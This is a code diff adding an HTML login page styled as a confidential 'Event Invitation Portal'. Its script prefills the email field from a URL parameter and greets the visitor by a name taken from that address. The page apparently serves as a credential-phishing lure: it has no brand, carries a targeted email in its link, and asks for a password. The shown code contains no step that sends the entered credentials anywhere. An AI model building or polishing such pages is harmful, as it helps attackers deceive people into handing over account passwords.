@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login to Your Account</title>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-image: url('https://i.postimg.cc/pVBJwW22/blue-notes-isolated-grey.png');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      height: 100vh;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      backdrop-filter: blur(10px);
+      background-color: rgba(255, 255, 255, 0.2);
+      z-index: 0;
+    }
+
+    .login-container {
+      background-color: rgba(255, 255, 255, 0.65);
+      backdrop-filter: blur(20px);
+      width: 100%;
+      max-width: 360px;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+      z-index: 1;
+      text-align: center;
+    }
+
+    .login-container img {
+      width: 60px;
+      margin-bottom: 15px;
+    }
+
+    .login-container h2 {
+      font-size: 24px;
+      margin-bottom: 10px;
+      color: #222;
+    }
+
+    .login-container p.subtext {
+      font-size: 13px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+
+    .login-container input {
+      width: 90%;
+      padding: 10px;
+      margin-bottom: 12px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 14px;
+      background-color: #f9f9f9;
+    }
+
+    .login-container button {
+      width: 90%;
+      padding: 12px;
+      background-color: #007BFF;
+      color: #fff;
+      border: none;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    .footer {
+      position: fixed;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      font-size: 14px;
+      color: #fff;
+      z-index: 1000;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="login-container">
+    <img src="https://i.postimg.cc/qMNXQ08h/user-male-circle-blue-512.webp">
+
+    <!-- ✅ Name will appear here -->
+    <h2 id="portalTitle">Event Invitation Portal</h2>
+
+    <p class="subtext">Strictly Confidential</p>
+
+    <input type="text" id="username" placeholder="Email" required>
+    <input type="password" placeholder="Password">
+
+    <button>Login</button>
+  </div>
+
+  <div class="footer">
+    2026 Email Invitation. All Rights Reserved
+  </div>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    const params = new URLSearchParams(window.location.search);
+    const emailParam = params.get("email");
+
+    const usernameField = document.getElementById("username");
+    const title = document.getElementById("portalTitle");
+
+    function extractFirstName(email) {
+      if (!email || !email.includes("@")) return "";
+
+      let namePart = email.split("@")[0];
+
+      // Remove dots, numbers, etc.
+      namePart = namePart.split(/[.\-_]/)[0];
+
+      // Capitalize first letter
+      return namePart.charAt(0).toUpperCase() + namePart.slice(1);
+    }
+
+    function applyName(email) {
+      const firstName = extractFirstName(email);
+
+      if (firstName) {
+        title.textContent = firstName;
+      } else {
+        title.textContent = "Event Invitation Portal";
+      }
+    }
+
+    // ✅ Prefill
+    if (emailParam && usernameField) {
+      const decodedEmail = decodeURIComponent(emailParam);
+      usernameField.value = decodedEmail;
+      applyName(decodedEmail);
+    }
+
+    // ✅ Live update
+    usernameField.addEventListener("input", function () {
+      applyName(this.value.trim());
+    });
+  });
+</script>
+
+</body>
+</html>
